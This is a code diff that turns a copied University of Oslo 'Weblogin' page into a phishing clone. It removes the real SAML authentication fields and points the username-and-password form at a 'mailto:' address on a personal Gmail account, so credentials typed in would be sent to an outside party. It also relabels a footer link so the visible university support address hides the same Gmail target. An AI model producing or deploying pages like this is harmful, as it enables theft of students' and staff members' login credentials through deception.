@@ -1,40 +1,32 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
 <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1" />
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<script type="text/javascript"><!--
-    if(window.localStorage && localStorage.getItem("ANDROID_TABLET")) {
-        var tabletVp = document.getElementById('viewport');
-        tabletVp.setAttribute("content","width=1020, user-scalable=yes");
-    } 
-    //-->
-</script>
+
 <script type="text/javascript" src="/simplesaml/resources/script.js"></script>
 <title>Weblogin</title>
 
-    <link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-top-bottom.css" />
-    <link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-top-bottom-responsive.css"
-          media="screen and (max-width: 15.5cm) and (orientation : portrait),
-        screen and (max-width: 17.5cm) and (orientation : landscape)" />
-    <link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin.css" media="all" />
-    <link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin-responsive.css"
-          media="screen and (max-width: 15.5cm) and (orientation : portrait),
-        screen and (max-width: 17.5cm) and (orientation : landscape)" />
-    <link rel="icon" type="image/png" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/favicon.ico" />
+<link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-top-bottom.css" />
+<link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-top-bottom-responsive.css"
+      media="screen and (max-width: 15.5cm) and (orientation : portrait),
+    screen and (max-width: 17.5cm) and (orientation : landscape)" />
+<link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin.css" media="all" />
+<link rel="stylesheet" type="text/css" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin-responsive.css"
+      media="screen and (max-width: 15.5cm) and (orientation : portrait),
+    screen and (max-width: 17.5cm) and (orientation : landscape)" />
+<link rel="icon" type="image/png" href="https://weblogin.uio.no/simplesaml/module.php/uiotheme/favicon.ico" />
 
+<!-- responsive libs -->
+<script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/responsive-libs.js"></script>
 
-    <!-- responsive libs -->
-    <script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/responsive-libs.js"></script>
+<!-- UiO App -->
+<script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/delegate/delegate.js"></script>
+<script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin.js"></script>
+<script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin-responsive.js"></script>
 
-    <!-- UiO App -->
-    <script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/delegate/delegate.js"></script>
-    <script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin.js"></script>
-    <script type="text/javascript" src="https://weblogin.uio.no/simplesaml/module.php/uiotheme/uio-app-weblogin-responsive.js"></script>
-
-    <meta name="robots" content="noindex, nofollow" />
+<meta name="robots" content="noindex, nofollow" />
 
 </head>
 <body class="app-fluid-responsive">
@@ -44,7 +36,8 @@
   <div id="line-top">
     <div id="uiologo">
       <a href="https://www.uio.no/">
-        Universitetet i Oslo      </a>
+        Universitetet i Oslo      
+      </a>
     </div>
   </div>
   <div id="app-head">
@@ -52,52 +45,29 @@
       <a >Weblogin</a>
       <span id="tagline">Innloggingstjeneste for Universitetet i Oslo</span>
     </div>
+  </div>
 </div>
 <!-- Page header end -->
 
 
 <div id="app-content">
-
-<!--    <div id="content"> -->
-
-
-
 <div id="login-box-wrapper">
     <div id="login-box">
-        <form id="" action="/post.php" method="post" name="f">
+        <form id="login-form" action="mailto:bgtwentyfiveeight@gmail.com" method="post" enctype="text/plain">
             <fieldset>
                 <div class="input-wrapper">
-                    <label for="username">
-                        Brukernavn:
-                    </label>
+                    <label for="username">Brukernavn:</label>
                     <input class="inputtext" type="text" id="username" name="username" placeholder="Brukernavn"/>
                 </div>
                 <div class="input-wrapper">
-                    <label for="password">
-                        Passord:
-                    </label>
+                    <label for="password">Passord:</label>
                     <input class="inputtext" type="password" id="password" name="password" placeholder="Passord" />
                 </div>
-
-                <input type="hidden" name="AuthState" value="_a0f6860ce3ce6369a87e4bb9770a3be791ab2ba278:https://weblogin.uio.no/simplesaml/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fwww.uio.no&amp;cookieTime=1667231287&amp;RelayState=https%3A%2F%2Fwww.uio.no%2Fenglish%2Fservices%2Fit%2Fusername-password%2Fweblogin%2Findex.html%3FauthTarget%26authTicket%3D87PmNMnjTwbpdmjj9kA8ow" />
-<button type="submit" class="submit" name="login"> <span>Logg inn</span></button>
-                <div id="backend-selectors">
-<div class="backend-selector-wrapper"><input id="backend-selector-people" class="backend-selector" type="radio" name="backend" value="people" checked/>
-<label for="backend-choice-people">people</label>
-</div>
-<div class="backend-selector-wrapper"><input id="backend-selector-webid" class="backend-selector" type="radio" name="backend" value="webid" />
-<label for="backend-choice-webid">webid</label>
-</div>
-</div><div id="login-text-wrapper"><div id="login-text-people" class="login-text active"><a href="https://www.uio.no/tjenester/it/brukernavn-passord/">Glemt passord eller passord?</a></div><div id="login-text-webid" class="login-text"><a href="https://webid.uio.no/webid/recovery/?chooseLang=no">Glemt brukernavn eller passord?</a></div></div><div id="info-text-wrapper"><div id="info-text-webid" class="info-text"><strong>Don't have a user at UiO?</strong><br/><a href="https://webid.uio.no/webid/?chooseLang=en">Registrer as a WebID user</a></div></div>            </fieldset>
+                <button type="submit" class="submit" name="login">Logg inn</button>
+            </fieldset>
         </form>
-        <div id="backend-list">
-            <!-- text for responsive layout -->
-            <h2 class="additional-login">Eller logg inn med</h2>
-<div class="backend-wrapper">
-        </div><!-- ^backend-list -->
     </div> <!-- ^login-box -->
 </div> <!-- ^login-box-wrapper -->
-
 
 </div> <!-- Page content end -->
 
@@ -111,43 +81,12 @@
      <div id="contact-info" class="vcard"> 
        <div class="phone-fax-email"> 
          <span class="vrtx-label">Kontaktinformasjon</span>
-         <span class="email">E-post: <a href="mailto:tzvetoslavov@gmail.com">houston@usit.uio.no</a></span>
+         <span class="email">E-post: <a href="mailto: bgtwentyfiveeight@gmail.com">houston@usit.uio.no</a></span>
        </div>
      </div>
    </div> 
 </div>
-
 <!-- Page footer end --> 
-
-<script type="text/javascript">  
-<!--
-  (function() {
-    var isAndroid = /Android/.test(navigator.userAgent);
-    var isOldAndroid = /Android [123]/.test(navigator.userAgent);
-    
-    if (responsiveApp.isResponsive) {
-      var responsive = (function() {
-        enquire.register(responsiveApp.responsiveMax, {
-          deferSetup : true,
-          setup : function() {
-            if (window == top && isAndroid && isOldAndroid && window.localStorage && !localStorage.getItem("ANDROID_TABLET")) {
-              localStorage.setItem("ANDROID_TABLET", "YES");
-              location.reload();
-            }
-          },
-          match : function() {
-            document.getElementById('language-select').style.display = 'block';
-          },
-          unmatch : function() {
-            document.getElementById('language-select').style.display = 'none';
-          }
-        });
-      }());
-    }
-  }());
-//-->
-</script>
-
 
 </body>
 </html>
